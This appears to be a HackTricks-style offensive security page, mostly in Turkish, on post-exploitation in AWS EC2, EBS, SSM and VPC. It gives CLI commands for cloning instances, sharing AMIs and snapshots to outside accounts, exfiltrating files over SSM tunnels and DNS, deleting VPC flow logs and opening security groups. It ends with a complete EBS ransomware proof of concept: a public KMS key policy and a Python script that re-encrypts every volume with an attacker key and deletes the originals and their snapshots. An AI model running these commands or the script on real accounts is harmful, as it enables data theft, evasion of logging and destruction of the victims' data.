# AWS - EC2, EBS, SSM & VPC Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## EC2 & VPC

Daha fazla bilgi için bakınız:

{{#ref}}
../../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/
{{#endref}}

### **Malicious VPC Mirror -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

VPC traffic mirroring **bir VPC içindeki EC2 instance'larının gelen ve giden trafiğini çoğaltır**; instance'ların kendilerine herhangi bir şey kurmaya gerek yoktur. Bu çoğaltılmış trafik genellikle analiz ve izleme için network intrusion detection system (IDS) gibi bir yere gönderilir.\
Bir saldırgan bunu kötüye kullanarak tüm trafiği yakalayabilir ve bundan hassas bilgileri elde edebilir:

Daha fazla bilgi için bu sayfaya bakın:

{{#ref}}
aws-malicious-vpc-mirror.md
{{#endref}}

### Copy Running Instance

Instances genellikle bir tür hassas bilgi içerir. İçeri girmek için farklı yollar vardır (bakınız [EC2 privilege escalation tricks](../../aws-privilege-escalation/aws-ec2-privesc/README.md)). Bununla birlikte, içeriğini kontrol etmenin bir diğer yolu **bir AMI oluşturmak ve ondan yeni bir instance (hatta kendi hesabınızda) çalıştırmaktır**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Snapshot dump

**Snapshots are backups of volumes**, genellikle **hassas bilgiler** içerir; bu yüzden bunları kontrol etmek bu bilgileri açığa çıkaracaktır.\
Eğer bir **volume without a snapshot** bulursanız şunları yapabilirsiniz: **Create a snapshot** oluşturup aşağıdaki işlemleri gerçekleştirmek veya hesabın içinde bir instance'a **mount it in an instance**:

{{#ref}}
aws-ebs-snapshot-dump.md
{{#endref}}

### Covert Disk Exfiltration via AMI Store-to-S3

EC2 AMI'yi doğrudan S3'e `CreateStoreImageTask` kullanarak dışa aktarın; böylece snapshot paylaşımı olmadan ham disk imajı elde edersiniz. Bu, instance'ın ağ yapılandırmasına dokunmadan tam çevrimdışı adli analiz veya veri hırsızlığı yapmanıza olanak tanır.

{{#ref}}
aws-ami-store-s3-exfiltration.md
{{#endref}}

### Live Data Theft via EBS Multi-Attach

Bir io1/io2 Multi-Attach volume'u ikinci bir instance'a ekleyin ve snapshot almadan canlı veriyi çekmek için onu read-only olarak mount edin. Hedef volume aynı AZ içinde zaten Multi-Attach etkinse bu yöntem kullanışlıdır.

{{#ref}}
aws-ebs-multi-attach-data-theft.md
{{#endref}}

### EC2 Instance Connect Endpoint Backdoor

Bir EC2 Instance Connect Endpoint oluşturun, ingress'e yetki verin ve yönetilen bir tünel üzerinden özel instance'lara erişmek için geçici SSH anahtarları inject edin. Kamu portlarını açmadan hızlı lateral hareket yolları sağlar.

{{#ref}}
aws-ec2-instance-connect-endpoint-backdoor.md
{{#endref}}

### EC2 ENI Secondary Private IP Hijack

Kurban ENI'nin secondary private IP'sini saldırgan kontrollü bir ENI'ye taşıyarak IP ile allowlist'e alınmış güvenilir host'ları taklit edin. Bu, belirli adreslere bağlı iç ACL'leri veya SG kurallarını atlamayı mümkün kılar.

{{#ref}}
aws-eni-secondary-ip-hijack.md
{{#endref}}

### Elastic IP Hijack for Ingress/Egress Impersonation

Kurban instance'dan bir Elastic IP'yi saldırgana yeniden ilişkilendirerek gelen trafiği yakalayın veya güvenilir genel IP'lermiş gibi görünen giden bağlantılar başlatın.

{{#ref}}
aws-eip-hijack-impersonation.md
{{#endref}}

### Security Group Backdoor via Managed Prefix Lists

Eğer bir security group kuralı customer-managed prefix list'e referans veriyorsa, saldırgan CIDR'lerini listeye eklemek SG'yi doğrudan değiştirmeden bağlı tüm SG kurallarında erişimi sessizce genişletir.

{{#ref}}
aws-managed-prefix-list-backdoor.md
{{#endref}}

### VPC Endpoint Egress Bypass

İzolasyonlu subnet'lerden outbound erişimi geri kazanmak için gateway veya interface VPC endpoint'leri oluşturun. AWS-managed private link'leri kullanmak, data exfiltration için eksik IGW/NAT kontrollerini atlamaya yarar.

{{#ref}}
aws-vpc-endpoint-egress-bypass.md
{{#endref}}

### VPC Flow Logs Cross-Account Exfiltration

VPC Flow Logs'u saldırgan kontrollü bir S3 bucket'a yönlendirerek ağ meta verisini (source/destination, ports) mağdur hesabın dışında sürekli toplayın; bu uzun vadeli keşif için kullanışlıdır.

{{#ref}}
aws-vpc-flow-logs-cross-account-exfiltration.md
{{#endref}}

### Data Exfiltration

#### DNS Exfiltration

Bir EC2'yi dışa kapatsanız bile, yine de **exfil via DNS** yapabilir.

- **VPC Flow Logs will not record this**.
- AWS DNS loglarına erişiminiz yoktur.
- Bunu devre dışı bırakmak için "enableDnsSupport"u false yapın:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Exfiltration via API calls

Bir saldırgan kendi kontrolündeki bir hesabın API endpoint'lerini çağırabilir. Cloudtrail bu çağrıları loglar ve saldırgan exfiltrate edilen verileri Cloudtrail loglarında görebilir.

### Open Security Group

Bu şekilde portları açarak ağ servislerine daha fazla erişim sağlayabilirsiniz:
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
### Privesc to ECS

Bir EC2 instance'ı çalıştırıp, onu ECS instance'larını çalıştırmak için kullanılmak üzere kaydederek, sonrasında bu ECS instance'ların verilerini çalmak mümkündür.

For [**more information check this**](../../aws-privilege-escalation/aws-ec2-privesc/README.md#privesc-to-ecs).

### Remove VPC flow logs
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### SSM Port Forwarding

Gerekli izinler:

- `ssm:StartSession`

Komut yürütmenin yanı sıra, SSM trafik tünellemesine izin verir; bu, Security Groups veya NACLs nedeniyle ağ erişimi olmayan EC2 instance'larından pivot yapmak için kötüye kullanılabilir.
Bunun kullanışlı olduğu senaryolardan biri, bir [Bastion Host](https://www.geeksforgeeks.org/what-is-aws-bastion-host/) üzerinden özel bir EKS cluster'ına pivot yapmaktır.

> Bir oturum başlatmak için SessionManagerPlugin'in yüklü olması gerekir: https://docs.aws.amazon.com/systems-manager/latest/userguide/install-plugin-macos-overview.html

1. SessionManagerPlugin'i makinenize kurun
2. Aşağıdaki komutu kullanarak Bastion EC2'ye giriş yapın:
```shell
aws ssm start-session --target "$INSTANCE_ID"
```
3. Bastion EC2 AWS geçici kimlik bilgilerini [Abusing SSRF in AWS EC2 environment](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html#abusing-ssrf-in-aws-ec2-environment) scripti ile alın  
4. Kimlik bilgilerini kendi makinenize `$HOME/.aws/credentials` dosyası içine `[bastion-ec2]` profili olarak aktarın  
5. Bastion EC2 olarak EKS'e giriş yapın:
```shell
aws eks update-kubeconfig --profile bastion-ec2 --region <EKS-CLUSTER-REGION> --name <EKS-CLUSTER-NAME>
```
6. `$HOME/.kube/config` dosyasındaki `server` alanını `https://localhost` adresini gösterecek şekilde güncelleyin.
7. Aşağıdaki şekilde bir SSM tüneli oluşturun:
```shell
sudo aws ssm start-session --target $INSTANCE_ID --document-name AWS-StartPortForwardingSessionToRemoteHost --parameters '{"host":["<TARGET-IP-OR-DOMAIN>"],"portNumber":["443"], "localPortNumber":["443"]}' --region <BASTION-INSTANCE-REGION>
```
8. `kubectl` aracından gelen trafik artık SSM tüneli üzerinden Bastion EC2 aracılığıyla yönlendiriliyor ve kendi makinenizden aşağıdaki komutu çalıştırarak özel EKS cluster'a erişebilirsiniz:
```shell
kubectl get pods --insecure-skip-tls-verify
```
Note that the SSL connections will fail unless you set the `--insecure-skip-tls-verify ` flag (or its equivalent in K8s audit tools). Seeing that the traffic is tunnelled through the secure AWS SSM tunnel, you are safe from any sort of MitM attacks.

Son olarak, bu teknik private EKS clusters'a özgü değildir. Rastgele domain ve portlar belirleyerek başka herhangi bir AWS servisine veya özel bir uygulamaya pivot yapabilirsiniz.

---

#### Hızlı Local ↔️ Remote Port Forward (AWS-StartPortForwardingSession)

Eğer sadece **EC2 instance'ından local host'unuza bir TCP port** yönlendirmeniz gerekiyorsa, `AWS-StartPortForwardingSession` SSM dokümanını kullanabilirsiniz (uzak host parametresi gerekli değildir):
```bash
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8000","localPortNumber"="8000" \
--region <REGION>
```
Bu komut, iş istasyonunuz (`localPortNumber`) ile instance üzerindeki seçili port (`portNumber`) arasında iki yönlü bir tünel oluşturur **without opening any inbound Security-Group rules**.

Yaygın kullanım durumları:

* **File exfiltration**
1. On the instance start a quick HTTP server that points to the directory you want to exfiltrate:

```bash
python3 -m http.server 8000
```

2. From your workstation fetch the files through the SSM tunnel:

```bash
curl http://localhost:8000/loot.txt -o loot.txt
```

* **İç ağ web uygulamalarına erişim (ör. Nessus)**
```bash
# Forward remote Nessus port 8834 to local 8835
aws ssm start-session --target i-0123456789abcdef0 \
--document-name AWS-StartPortForwardingSession \
--parameters "portNumber"="8834","localPortNumber"="8835"
# Browse to http://localhost:8835
```
İpucu: CloudTrail clear-text içeriğini kaydetmemesi için kanıtları exfiltrating etmeden önce sıkıştırıp şifreleyin:
```bash
# On the instance
7z a evidence.7z /path/to/files/* -p'Str0ngPass!'
```
### AMI Paylaşımı
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### Kamuya açık ve özel AMIs içinde hassas bilgi arama

- [https://github.com/saw-your-packet/CloudShovel](https://github.com/saw-your-packet/CloudShovel): CloudShovel, **kamuya açık veya özel Amazon Machine Images (AMIs) içinde hassas bilgi aramak** için tasarlanmış bir araçtır. Hedef AMI'lerden instance başlatma, volümlerini bağlama ve potansiyel sırlar veya hassas veriler için tarama işlemlerini otomatikleştirir.

### EBS Snapshot Paylaşımı
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### EBS Ransomware PoC

S3 post-exploitation notlarındaki Ransomware gösterimine benzer bir PoC. KMS, çeşitli AWS hizmetlerini şifrelemek için kullanılmasının ne kadar kolay olduğuna bağlı olarak Ransomware Management Service anlamına gelen RMS olarak yeniden adlandırılmalı.

İlk olarak 'attacker' AWS hesabından KMS içinde bir customer managed key oluşturun. Bu örnekte anahtar verilerini AWS'in benim için yönetmesine izin vereceğiz, ancak gerçekçi bir senaryoda bir malicious actor anahtar verilerini AWS'in kontrolü dışında tutardı. Key policy'yi herhangi bir AWS account Principal'ının anahtarı kullanmasına izin verecek şekilde değiştirin. Bu key policy için, hesabın adı 'AttackSim' idi ve tüm erişime izin veren policy kuralı 'Outside Encryption' olarak adlandırıldı.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
The key policy kuralının bir EBS hacmini şifrelemek için kullanılabilmesine izin vermek üzere aşağıdakilerin etkinleştirilmiş olması gerekir:

- `kms:CreateGrant`
- `kms:Decrypt`
- `kms:DescribeKey`
- `kms:GenerateDataKeyWithoutPlainText`
- `kms:ReEncrypt`

Artık kullanılabilecek halka açık erişimli bir key bulundu. 'victim' hesabını kullanabiliriz; bu hesapta şifrelenmemiş EBS hacimleri bağlı EC2 instance'ları bulunuyor. Bu 'victim' hesabın EBS hacimleri hedefimizdir; bu saldırı yüksek ayrıcalıklı bir AWS hesabının varsayılan ihlali altında gerçekleştirilmektedir.

![Pasted image 20231231172655](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/5b9a96cd-6006-4965-84a4-b090456f90c6) ![Pasted image 20231231172734](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4294289c-0dbd-4eb6-a484-60b4e4266459)

S3 ransomware örneğine benzer şekilde. Bu saldırı, bağlı EBS hacimlerinin snapshot'larını alarak kopyalarını oluşturacak, 'attacker' hesabındaki halka açık key'i kullanarak yeni EBS hacimlerini şifreleyecek, ardından orijinal EBS hacimlerini EC2 instance'larından ayırıp silecek ve son olarak yeni şifrelenmiş EBS hacimlerini oluşturmak için kullanılan snapshot'ları silecektir. ![Pasted image 20231231173130](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/34808990-2b3b-4975-a523-8ee45874279e)

Sonuç olarak hesapta yalnızca şifrelenmiş EBS hacimleri kalır.

![Pasted image 20231231173338](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/eccdda58-f4b1-44ea-9719-43afef9a8220)

Ayrıca belirtmek gerekir ki script, orijinal EBS hacimlerini ayırıp silmek için EC2 instance'larını durdurdu. Orijinal şifrelenmemiş hacimler artık yok.

![Pasted image 20231231173931](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/cc31a5c9-fbb4-4804-ac87-911191bb230e)

Son olarak, 'attacker' hesabındaki key policy'ye geri dönün ve key policy'den 'Outside Encryption' policy kuralını kaldırın.
```json
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": ["kms:CreateGrant", "kms:ListGrants", "kms:RevokeGrant"],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
Yeni ayarlanan key policy'nin yayılması için bir süre bekleyin. Ardından 'victim' hesabına geri dönün ve yeni şifrelenmiş EBS hacimlerinden birini eklemeyi deneyin. Hacmi ekleyebildiğinizi göreceksiniz.

![Pasted image 20231231174131](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/ba9e5340-7020-4af9-95cc-0e02267ced47) ![Pasted image 20231231174258](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/6c3215ec-4161-44e2-b1c1-e32f43ad0fa4)

Ancak şifrelenmiş EBS hacmiyle EC2 instance'ını gerçekten yeniden başlatmayı denediğinizde işlem başarısız olur ve bağlı EBS hacmi anahtar kullanılarak çözülemediği için instance 'pending' durumundan tekrar 'stopped' durumuna döner.

![Pasted image 20231231174322](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/73456c22-0828-4da9-a737-e4d90fa3f514) ![Pasted image 20231231174352](https://github.com/DialMforMukduk/hacktricks-cloud/assets/35155877/4d83a90e-6fa9-4003-b904-a4ba7f5944d0)

Bu kullanılan python script'idir. Script, 'victim' hesabı için AWS kimlik bilgilerini ve şifreleme için kullanılacak anahtarın kamuya açık bir AWS ARN değerini alır. Script, hedef AWS hesabındaki TÜM EC2 instance'lara bağlı TÜM mevcut EBS hacimlerinin şifrelenmiş kopyalarını oluşturacak, ardından her EC2 instance'ını durduracak, orijinal EBS hacimlerini ayıracak, silecek ve süreçte kullanılan tüm snapshot'ları son olarak silecektir. Bu, hedef 'victim' hesabında yalnızca şifrelenmiş EBS hacimlerinin kalmasına neden olacaktır. BU SCRIPTİ SADECE BİR TEST ORTAMINDA KULLANIN, YIKICIDIR VE TÜM ORİJİNAL EBS HACİMLERİNİ SİLECEKTİR. Kullanılan KMS anahtarıyla bunları kurtarabilir ve snapshot'lar aracılığıyla orijinal hallerine geri döndürebilirsiniz, fakat günün sonunda bunun bir ransomware PoC olduğunu bilmenizi istiyoruz.
```
import boto3
import argparse
from botocore.exceptions import ClientError

def enumerate_ec2_instances(ec2_client):
instances = ec2_client.describe_instances()
instance_volumes = {}
for reservation in instances['Reservations']:
for instance in reservation['Instances']:
instance_id = instance['InstanceId']
volumes = [vol['Ebs']['VolumeId'] for vol in instance['BlockDeviceMappings'] if 'Ebs' in vol]
instance_volumes[instance_id] = volumes
return instance_volumes

def snapshot_volumes(ec2_client, volumes):
snapshot_ids = []
for volume_id in volumes:
snapshot = ec2_client.create_snapshot(VolumeId=volume_id)
snapshot_ids.append(snapshot['SnapshotId'])
return snapshot_ids

def wait_for_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
ec2_client.get_waiter('snapshot_completed').wait(SnapshotIds=[snapshot_id])

def create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn):
new_volume_ids = []
for snapshot_id in snapshot_ids:
snapshot_info = ec2_client.describe_snapshots(SnapshotIds=[snapshot_id])['Snapshots'][0]
volume_id = snapshot_info['VolumeId']
volume_info = ec2_client.describe_volumes(VolumeIds=[volume_id])['Volumes'][0]
availability_zone = volume_info['AvailabilityZone']

volume = ec2_client.create_volume(SnapshotId=snapshot_id, AvailabilityZone=availability_zone,
Encrypted=True, KmsKeyId=kms_key_arn)
new_volume_ids.append(volume['VolumeId'])
return new_volume_ids

def stop_instances(ec2_client, instance_ids):
for instance_id in instance_ids:
try:
instance_description = ec2_client.describe_instances(InstanceIds=[instance_id])
instance_state = instance_description['Reservations'][0]['Instances'][0]['State']['Name']

if instance_state == 'running':
ec2_client.stop_instances(InstanceIds=[instance_id])
print(f"Stopping instance: {instance_id}")
ec2_client.get_waiter('instance_stopped').wait(InstanceIds=[instance_id])
print(f"Instance {instance_id} stopped.")
else:
print(f"Instance {instance_id} is not in a state that allows it to be stopped (current state: {instance_state}).")

except ClientError as e:
print(f"Error stopping instance {instance_id}: {e}")

def detach_and_delete_volumes(ec2_client, volumes):
for volume_id in volumes:
try:
ec2_client.detach_volume(VolumeId=volume_id)
ec2_client.get_waiter('volume_available').wait(VolumeIds=[volume_id])
ec2_client.delete_volume(VolumeId=volume_id)
print(f"Deleted volume: {volume_id}")
except ClientError as e:
print(f"Error detaching or deleting volume {volume_id}: {e}")


def delete_snapshots(ec2_client, snapshot_ids):
for snapshot_id in snapshot_ids:
try:
ec2_client.delete_snapshot(SnapshotId=snapshot_id)
print(f"Deleted snapshot: {snapshot_id}")
except ClientError as e:
print(f"Error deleting snapshot {snapshot_id}: {e}")

def replace_volumes(ec2_client, instance_volumes):
instance_ids = list(instance_volumes.keys())
stop_instances(ec2_client, instance_ids)

all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
detach_and_delete_volumes(ec2_client, all_volumes)

def ebs_lock(access_key, secret_key, region, kms_key_arn):
ec2_client = boto3.client('ec2', aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, kms_key_arn)  # New encrypted volumes are created but not attached
replace_volumes(ec2_client, instance_volumes)  # Stops instances, detaches and deletes old volumes
delete_snapshots(ec2_client, snapshot_ids)  # Optionally delete snapshots if no longer needed

def parse_arguments():
parser = argparse.ArgumentParser(description='EBS Volume Encryption and Replacement Tool')
parser.add_argument('--access-key', required=True, help='AWS Access Key ID')
parser.add_argument('--secret-key', required=True, help='AWS Secret Access Key')
parser.add_argument('--region', required=True, help='AWS Region')
parser.add_argument('--kms-key-arn', required=True, help='KMS Key ARN for EBS volume encryption')
return parser.parse_args()

def main():
args = parse_arguments()
ec2_client = boto3.client('ec2', aws_access_key_id=args.access_key, aws_secret_access_key=args.secret_key, region_name=args.region)

instance_volumes = enumerate_ec2_instances(ec2_client)
all_volumes = [vol for vols in instance_volumes.values() for vol in vols]
snapshot_ids = snapshot_volumes(ec2_client, all_volumes)
wait_for_snapshots(ec2_client, snapshot_ids)
create_encrypted_volumes(ec2_client, snapshot_ids, args.kms_key_arn)
replace_volumes(ec2_client, instance_volumes)
delete_snapshots(ec2_client, snapshot_ids)

if __name__ == "__main__":
main()
```
## Kaynaklar

- [Pentest Partners – How to transfer files in AWS using SSM](https://www.pentestpartners.com/security-blog/how-to-transfer-files-in-aws-using-ssm/)

{{#include ../../../../banners/hacktricks-training.md}}
